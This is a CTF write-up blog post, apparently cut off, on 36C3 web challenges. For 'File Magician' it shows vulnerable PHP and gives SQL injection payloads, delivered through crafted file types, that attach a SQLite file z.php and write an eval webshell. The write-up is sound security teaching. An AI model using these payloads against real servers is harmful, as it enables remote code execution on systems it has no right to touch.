<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=manifest href=/manifest.json><meta name=description content="ç­¾åˆ°é€‰æ‰‹ä¸è¯·è‡ªæ¥ï¼Œç»è¿‡äº†å¥½å‡ å¤©çš„ç¢ç£¨ï¼Œç»ˆäºæŠŠè¿™æ¬¡æ¯”èµ›çš„é¢˜ç›®éƒ½å¼„å¾—å·®ä¸å¤šäº†ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹æœ¬æ¬¡æ¯”èµ› Web é¢˜ç›®çš„è§£æ³•ã€‚
"><title>36c3 Web å­¦ä¹ è®°å½•</title>
<link rel=canonical href=https://blog.zeddyu.info/2020/01/08/36c3-web/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="36c3 Web å­¦ä¹ è®°å½•">
<meta property="og:description" content="ç­¾åˆ°é€‰æ‰‹ä¸è¯·è‡ªæ¥ï¼Œç»è¿‡äº†å¥½å‡ å¤©çš„ç¢ç£¨ï¼Œç»ˆäºæŠŠè¿™æ¬¡æ¯”èµ›çš„é¢˜ç›®éƒ½å¼„å¾—å·®ä¸å¤šäº†ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹æœ¬æ¬¡æ¯”èµ› Web é¢˜ç›®çš„è§£æ³•ã€‚
">
<meta property="og:url" content="https://blog.zeddyu.info/2020/01/08/36c3-web/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2020-01-08T02:24:13+00:00"><meta property="article:modified_time" content="2020-01-08T02:24:13+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="36c3 Web å­¦ä¹ è®°å½•">
<meta name=twitter:description content="ç­¾åˆ°é€‰æ‰‹ä¸è¯·è‡ªæ¥ï¼Œç»è¿‡äº†å¥½å‡ å¤©çš„ç¢ç£¨ï¼Œç»ˆäºæŠŠè¿™æ¬¡æ¯”èµ›çš„é¢˜ç›®éƒ½å¼„å¾—å·®ä¸å¤šäº†ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹æœ¬æ¬¡æ¯”èµ› Web é¢˜ç›®çš„è§£æ³•ã€‚
">
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-112937997-1','auto'),ga('send','pageview'))</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
CTF
</a>
</header>
<h2 class=article-title>
<a href=/2020/01/08/36c3-web/>36c3 Web å­¦ä¹ è®°å½•</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Jan 08, 2020</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
14 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<p>ç­¾åˆ°é€‰æ‰‹ä¸è¯·è‡ªæ¥ï¼Œç»è¿‡äº†å¥½å‡ å¤©çš„ç¢ç£¨ï¼Œç»ˆäºæŠŠè¿™æ¬¡æ¯”èµ›çš„é¢˜ç›®éƒ½å¼„å¾—å·®ä¸å¤šäº†ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹æœ¬æ¬¡æ¯”èµ› Web é¢˜ç›®çš„è§£æ³•ã€‚</p>
<p>å¦‚æœå¸ˆå‚…ä»¬æœ‰æ›´å¥½æ›´æœ‰æ„æ€çš„è§£æ³•ï¼Œæ¬¢è¿å¤šå¤šä¸èœé¸¡äº¤æµã€‚éå¸¸æ„Ÿè°¢ @rebirth @wonderkun @wupco ç­‰å¸ˆå‚…åœ¨æˆ‘å­¦ä¹ æœ¬æ¬¡æ¯”èµ›èµ›é¢˜æ—¶å€™ä¸åŒå…¶çƒ¦åœ°æŒ‡å¯¼æˆ‘ã€‚</p>
<h2 id=file-magician>File Magician</h2>
<blockquote>
<p><strong>Difficulty estimate</strong>: easy</p>
<p><strong>Solved</strong>:133/321</p>
<p><strong>Points</strong>: round(1000 Â· min(1, 10 / (9 + [133 solves]))) = <strong>70</strong> points</p>
<p><strong>Description:</strong></p>
<p>Finally (again), a minimalistic, open-source file hosting solution.</p>
<p><strong>Download:</strong></p>
<p><a class=link href=https://github.com/ZeddYu/36c3-CTF-Web/blob/master/file%20magician/file%20magician-3ace41f3b0282a70.tar.xz target=_blank rel=noopener>file magician-3ace41f3b0282a70.tar.xz (2.1 KiB)</a></p>
</blockquote>
<p>ç®—æ˜¯ Web å½“ä¸­çš„ä¸€ä¸ªç­¾åˆ°é¢˜ï¼Œç›´æ¥ç»™å‡º Docker æ–‡ä»¶æºä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°æ­èµ·æ¥è¯•è¯•ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
<span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;display_errors&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
<span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;display_startup_errors&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
<span class=nx>session_start</span><span class=p>();</span>

<span class=k>if</span><span class=p>(</span> <span class=o>!</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]))</span> <span class=p>{</span>
    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>32</span><span class=p>));</span>
<span class=p>}</span>

<span class=nv>$d</span> <span class=o>=</span> <span class=s1>&#39;/var/www/html/files/&#39;</span><span class=o>.</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span><span class=p>;</span>
<span class=o>@</span><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=mo>0700</span><span class=p>,</span> <span class=k>TRUE</span><span class=p>);</span>
<span class=nx>chdir</span><span class=p>(</span><span class=nv>$d</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;chdir&#39;</span><span class=p>);</span>

<span class=nv>$db</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>PDO</span><span class=p>(</span><span class=s1>&#39;sqlite:&#39;</span> <span class=o>.</span> <span class=nv>$d</span> <span class=o>.</span> <span class=s1>&#39;db.sqlite3&#39;</span><span class=p>);</span>
<span class=nv>$db</span><span class=o>-&gt;</span><span class=na>setAttribute</span><span class=p>(</span><span class=nx>PDO</span><span class=o>::</span><span class=na>ATTR_ERRMODE</span><span class=p>,</span> <span class=nx>PDO</span><span class=o>::</span><span class=na>ERRMODE_EXCEPTION</span><span class=p>);</span>
<span class=nv>$db</span><span class=o>-&gt;</span><span class=na>exec</span><span class=p>(</span><span class=s1>&#39;CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);&#39;</span><span class=p>);</span>

<span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;size&#39;</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=o>*</span><span class=mi>1024</span> <span class=p>){</span>
    <span class=nv>$s</span> <span class=o>=</span> <span class=s2>&#34;INSERT INTO upload(info) VALUES (&#39;&#34;</span> <span class=o>.</span><span class=p>(</span><span class=k>new</span> <span class=nx>finfo</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>])</span><span class=o>.</span> <span class=s2>&#34; &#39;);&#34;</span><span class=p>;</span>
    <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>exec</span><span class=p>(</span><span class=nv>$s</span><span class=p>);</span>
    <span class=nx>move_uploaded_file</span><span class=p>(</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=nv>$d</span> <span class=o>.</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>lastInsertId</span><span class=p>())</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;move_upload_file&#39;</span><span class=p>);</span>
<span class=p>}</span>

<span class=nv>$uploads</span> <span class=o>=</span> <span class=p>[];</span>
<span class=nv>$sql</span> <span class=o>=</span> <span class=s1>&#39;SELECT * FROM upload&#39;</span><span class=p>;</span>
<span class=k>foreach</span> <span class=p>(</span><span class=nv>$db</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=nv>$sql</span><span class=p>)</span> <span class=k>as</span> <span class=nv>$row</span><span class=p>)</span> <span class=p>{</span>
    <span class=nv>$uploads</span><span class=p>[]</span> <span class=o>=</span> <span class=p>[</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>],</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;info&#39;</span><span class=p>]];</span>
<span class=p>}</span>
<span class=cp>?&gt;</span><span class=err>
</span><span class=err>&lt;!doctype html&gt;
</span><span class=err>&lt;html lang=&#34;en&#34;&gt;
</span><span class=err>&lt;head&gt;
</span><span class=err>    &lt;meta charset=&#34;utf-8&#34;&gt;
</span><span class=err>    &lt;title&gt;file magician&lt;/title&gt;
</span><span class=err>&lt;/head&gt;
</span><span class=err>&lt;form enctype=&#34;multipart/form-data&#34; method=&#34;post&#34;&gt;
</span><span class=err>    &lt;input type=&#34;file&#34; name=&#34;file&#34;&gt;
</span><span class=err>    &lt;input type=&#34;submit&#34; value=&#34;upload&#34;&gt;
</span><span class=err>&lt;/form&gt;
</span><span class=err>&lt;table&gt;
</span><span class=err>    &lt;?php foreach($uploads as $upload):?&gt;
</span><span class=err>        &lt;tr&gt;
</span><span class=err>            &lt;td&gt;&lt;a href=&#34;&lt;?= &#39;/files/&#39; . $_SESSION[&#39;id&#39;] . &#39;/&#39; . $upload[0] ?&gt;&#34;&gt;&lt;?= $upload[0] ?&gt;&lt;/a&gt;&lt;/td&gt;
</span><span class=err>            &lt;td&gt;&lt;?= $upload[1] ?&gt;&lt;/td&gt;
</span><span class=err>        &lt;/tr&gt;
</span><span class=err>    &lt;?php endforeach?&gt;
</span><span class=err>&lt;/table&gt;
</span></code></pre></div><p>é¢˜ç›®åŠŸèƒ½ç‚¹å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶ååœ¨è‡ªå·±çš„ sandbox å½“ä¸­çœ‹åˆ°è‡ªå·±çš„æ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ç”±<code>(new finfo)->file</code>æ¥åˆ¤æ–­çš„ï¼Œè¿˜ä½¿ç”¨äº† sqlite è¿›è¡Œå­˜å‚¨æ–‡ä»¶ä¸Šä¼ çš„è®°å½•ã€‚</p>
<p>ç”±äºåˆ›å»ºçš„æ•°æ®åº“è§„å®šäº† id ä¸ºè‡ªå¢é•¿çš„æ•´å‹ä¸»é”®ï¼Œè€Œä¸”å®ƒä½¿ç”¨äº†<code>lastInsertId()</code>è¿”å›æœ€åä¸€æ¬¡ insert æ•°æ®çš„ id ä½œä¸ºæ–‡ä»¶å</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>move_uploaded_file</span><span class=p>(</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=nv>$d</span> <span class=o>.</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>lastInsertId</span><span class=p>())</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;move_upload_file&#39;</span><span class=p>);</span>
</code></pre></div><p>æ‰€ä»¥æˆ‘ä»¬åŸºæœ¬ä¸Šå¯ä»¥ä¸ç”¨è€ƒè™‘æ˜¯å¦å­˜åœ¨é€šè¿‡å¯æ§æ–‡ä»¶åä¸Šä¼ æ–‡ä»¶ Getshell çš„æ“ä½œäº†ã€‚</p>
<p>çºµè§‚æ•´ä¸ªæ–‡ä»¶ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å¯æ§åˆ¶çš„è¾“å…¥ç‚¹ä¹Ÿåªæœ‰åœ¨æ–‡ä»¶ç±»å‹å½“ä¸­ï¼Œæ–‡ä»¶ç±»å‹åˆè¢«æ‹¼å…¥åˆ°äº† sql è¯­å¥å½“ä¸­</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php>    <span class=nv>$s</span> <span class=o>=</span> <span class=s2>&#34;INSERT INTO upload(info) VALUES (&#39;&#34;</span> <span class=o>.</span><span class=p>(</span><span class=k>new</span> <span class=nx>finfo</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>])</span><span class=o>.</span> <span class=s2>&#34; &#39;);&#34;</span><span class=p>;</span>
</code></pre></div><p>æ‰€ä»¥æ¯”è¾ƒæ˜æ˜¾ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œ sql æ³¨å…¥æ¥è¿›è¡Œä¸€äº›æ“ä½œäº†ã€‚</p>
<p>æˆ‘çš„æ€è·¯å°±æ˜¯ fuzz ä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå¯èƒ½å­˜åœ¨æŸäº›æ–‡ä»¶ä½¿ç”¨<code>finfo</code>å¾—å‡ºæ¥çš„ç»“æœå«æœ‰å•å¼•å·ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½å¤Ÿæ’å…¥å¯æ§æ•°æ®ï¼Œäºæ˜¯æˆ‘å°±å¼€å§‹ fuzz æ–‡ä»¶å¤´ï¼Œä»<code>0x00</code>åˆ°<code>0xff0xff</code>ã€‚</p>
<p>ç»ˆäºåœ¨<code>0x1f0x9d</code>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯<code>compress'd data</code>ï¼Œè™½ç„¶æœ‰å•å¼•å·ï¼Œä½†æ˜¯ä¸å­˜åœ¨æˆ‘ä»¬å¯æ§çš„æ•°æ®ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªæ˜¯<code>0xfb0x01</code>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯<code>QDOS object ''</code>ï¼Œçœ‹èµ·æ¥å¾ˆå¯¹çš„æ ·å­ï¼Œæœ‰ä¸¤ä¸ªå•å¼•å·ï¼Œå¹¶ä¸”æˆ‘ä»¬è²Œä¼¼å¯ä»¥åœ¨å•å¼•å·ä¹‹é—´æ’å…¥æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿æµ‹è¯•ä¸€ä¸‹</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png loading=lazy>
</a>
</figure></p>
<p>å‘ç°è¿™é‡Œè¢«åƒæ‰äº†ä¸€ä¸ª<code>p</code>ï¼Œäºæ˜¯æˆ‘ä»¬è°ƒæ•´ä¸€ä¸‹ payload å°±å¯ä»¥ç”¨æ¥æ³¨å…¥äº†ã€‚</p>
<p>sqlite æ˜¯å¯ä»¥ç”¨ .php æ–‡ä»¶åæ¥ä½œä¸ºå­˜å‚¨æ ¼å¼æ–‡ä»¶çš„ï¼Œè€Œä¸”å½“å‰ç›®å½•å¯å†™ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ sqlite attach ä¸€ä¸ª z.php çš„æ–¹æ³•æ¥å†™ shell äº†ã€‚</p>
<pre tabindex=0><code class=language-sqlite data-lang=sqlite>ATTACH DATABASE 'z.php' AS t;create TABLE t.e (d text);/*
</code></pre><pre tabindex=0><code class=language-sqlite data-lang=sqlite>ATTACH DATABASE 'z.php' AS t;insert INTO t.e (d) VALUES ('&lt;?php eval($_POST[a])?&gt;');/*
</code></pre><p>è¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„å°±æ˜¯æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†ä¸¤æ¬¡æ¥å†™ shell</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png loading=lazy>
</a>
</figure></p>
<h3 id=other-file>other file</h3>
<p>çœ‹å…¶ä»–é€‰æ‰‹çš„å…¬å¼€çš„ wp ä¹Ÿæ˜¯å¾ˆæœ‰è¶£çš„ä¸€ä»¶äº‹ï¼Œç„¶åä» ctftime ä¸Šå…¬å¼€çš„ wpï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿˜å­˜åœ¨ç€è¿™ä¹ˆä¸€äº›æ–‡ä»¶å¯ä»¥ç”¨æ¥æ³¨å…¥ã€‚</p>
<h4 id=tex-dvi-file>TeX DVI file</h4>
<p>0xf702 æ–‡ä»¶å¤´ï¼Œåœ¨å¡«å……ä¸€å®šæ•°æ®åæœ‰æˆ‘ä»¬å®Œå…¨å¯æ§çš„æ•°æ®</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png loading=lazy>
</a>
</figure></p>
<h4 id=jpeg>jpeg</h4>
<p>åœ¨ jpeg çš„ EXIF æ•°æ®æ®µä¸­æœ‰ç”¨æ¥æ ‡è¯† software çš„æ•°æ®ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼ŒåŒæ ·ç”¨æ¥æ ‡è¯† comment çš„åœ°æ–¹æˆ‘ä»¬ä¹Ÿå¯æ§ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ exiftool æ¥ä¿®æ”¹å›¾ç‰‡ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>exiftool -overwrite_original -comment<span class=o>=</span><span class=s2>&#34;payload&#34;</span> -software<span class=o>=</span><span class=s2>&#34;payload2&#34;</span> 1.jpg
</code></pre></div><p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png loading=lazy>
</a>
</figure></p>
<h4 id=heading>#!</h4>
<p>æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨<code>#!/</code>çš„æ–‡ä»¶æ¥æ„é€  payload</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png loading=lazy>
</a>
</figure></p>
<h4 id=gz>gz</h4>
<p>åˆ©ç”¨<code>gunzip</code>ç”Ÿæˆçš„ gz æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œæˆ‘ä»¬å¯æ§çš„æ•°æ®æ˜¯å®ƒçš„æ–‡ä»¶å</p>
<p><figure>
<a href=https://posts.xh4h.com/assets/images/36c3/gunzip1.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://posts.xh4h.com/assets/images/36c3/gunzip1.png loading=lazy>
</a>
</figure></p>
<p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹ gz æ–‡ä»¶å†…å®¹</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png loading=lazy>
</a>
</figure></p>
<h2 id=writeupbin>WriteUpBin</h2>
<blockquote>
<p><strong>Difficulty estimate</strong>: medium</p>
<p><strong>Solved</strong>:13/321</p>
<p><strong>Points</strong>: round(1000 Â· min(1, 10 / (9 + [13 solves]))) = <strong>455</strong> points</p>
<p><strong>Description:</strong></p>
<p>Finally (again), a minimalistic, open-source social writeup hosting solution.</p>
<p><strong>Download:</strong></p>
<p><a class=link href=https://github.com/ZeddYu/36c3-CTF-Web/blob/master/writeupbin/WriteupBin-10b65573b511269f.tar.xz target=_blank rel=noopener>WriteupBin-10b65573b511269f.tar.xz</a></p>
</blockquote>
<p>ä¸€é“æ¯”è¾ƒæœ‰æ„æ€çš„ä¾§ä¿¡é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰€ç»™é™„ä»¶æ­å»ºå½¢å¼çŸ¥é“ï¼Œflag å­˜æ”¾åœ¨æ•°æ®åº“å½“ä¸­ï¼Œå¹¶ä¸”æ˜¯åœ¨ admin ç”¨æˆ·çš„ç¬¬ä¸€æ¡ writeup æ•°æ®çš„å†…å®¹å½“ä¸­ï¼Œé¢˜ç›®æä¾›ç®€å•çš„ä¸Šä¼ æ–‡æœ¬çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥æäº¤ç»™ admin ï¼Œè®© admin ç»™ä½ ç‚¹èµã€‚</p>
<p>é¡¹ç›®ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre tabindex=0><code>.
â”œâ”€â”€ Dockerfile							//Dockeræ–‡ä»¶
â”œâ”€â”€ admin.py								//ä½¿ç”¨seleniumæ¨¡æ‹Ÿadminç™»å½•å¹¶ç‚¹èµ
â”œâ”€â”€ db.sql									//æ•°æ®åº“æ–‡ä»¶
â”œâ”€â”€ docker-stuff
â”‚Â Â  â”œâ”€â”€ default							//é…ç½®æ–‡ä»¶
â”‚Â Â  â””â”€â”€ www.conf						//é…ç½®æ–‡ä»¶
â”œâ”€â”€ www
â”‚Â Â  â”œâ”€â”€ general.php					//è¿æ¥æ•°æ®åº“è®¾ç½®headerå¤´ç­‰ä¸€äº›åˆå§‹åŒ–æ“ä½œ
â”‚Â Â  â”œâ”€â”€ html
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ add.php					//æ·»åŠ writeupç›¸å…³æ“ä½œ
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ admin.php				//æŠŠwriteupæäº¤ç»™admin
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ index.php				//å…¥å£æ–‡ä»¶
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ like.php				//ç‚¹èµæ“ä½œ
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ login_admin.php	//adminç™»é™†æ“ä½œ
â”‚Â Â  â”‚Â Â  â””â”€â”€ show.php				//è·å–writeupå†…å®¹
â”‚Â Â  â””â”€â”€ views
â”‚Â Â      â”œâ”€â”€ header.php			//åœ¨é¡µé¢ä¸Šæ–¹å±•ç¤ºç›®å‰idæäº¤çš„writeup
â”‚Â Â      â”œâ”€â”€ home.php				//é¡µé¢ä¸­éƒ¨ç”¨æ¥æä¾›ç»™ç”¨æˆ·è¾“å…¥çš„ç•Œé¢
â”‚Â Â      â””â”€â”€ show.php				//ç‚¹èµã€æäº¤ç»™adminçš„å±•ç¤ºé¡µé¢
â””â”€â”€ ynetd										//ç”¨æ¥å¯åŠ¨ admin.py
</code></pre><p>æ—¢ç„¶ flag åœ¨æ•°æ®åº“å½“ä¸­ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é¦–å…ˆæ¥çœ‹çœ‹ show.php ï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶å¯ä»¥ç›´æ¥ç”¨æ¥è·å– writeup çš„å†…å®¹ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>include_once</span> <span class=s1>&#39;../general.php&#39;</span><span class=p>;</span>

<span class=nv>$stmt</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span><span class=s1>&#39;SELECT id, content FROM `writeup` WHERE `id` = ?&#39;</span><span class=p>);</span>
<span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>bind_param</span><span class=p>(</span><span class=s1>&#39;s&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]);</span>
<span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
<span class=nv>$writeup</span> <span class=o>=</span> <span class=nx>mysqli_fetch_all</span><span class=p>(</span><span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>get_result</span><span class=p>(),</span> <span class=nx>MYSQLI_ASSOC</span><span class=p>)[</span><span class=mi>0</span><span class=p>];</span>


<span class=nv>$stmt</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span><span class=s1>&#39;SELECT user_id FROM `like` WHERE `writeup_id` = ?&#39;</span><span class=p>);</span>
<span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>bind_param</span><span class=p>(</span><span class=s1>&#39;s&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]);</span>
<span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
<span class=nv>$result</span> <span class=o>=</span> <span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>get_result</span><span class=p>();</span>
<span class=nv>$likes</span> <span class=o>=</span> <span class=nx>mysqli_fetch_all</span><span class=p>(</span><span class=nv>$result</span><span class=p>,</span> <span class=nx>MYSQLI_ASSOC</span><span class=p>);</span>

<span class=k>include</span><span class=p>(</span><span class=s1>&#39;../views/header.php&#39;</span><span class=p>);</span>
<span class=k>include</span><span class=p>(</span><span class=s1>&#39;../views/show.php&#39;</span><span class=p>);</span>
